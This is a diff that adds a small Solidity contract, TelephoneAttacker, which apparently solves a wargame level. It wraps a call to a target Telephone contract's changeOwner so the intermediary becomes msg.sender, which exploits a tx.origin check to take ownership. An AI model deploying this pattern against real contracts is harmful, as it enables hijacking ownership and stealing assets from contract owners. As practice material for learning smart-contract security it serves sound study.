@@ -1,0 +1,11 @@
+contract TelephoneAttacker {
+    Telephone private telephone;
+
+    constructor(address _contractAddress) public {
+        telephone = Telephone(_contractAddress);
+    }
+
+    function changeOwner() public {
+        telephone.changeOwner(msg.sender);
+    }
+}
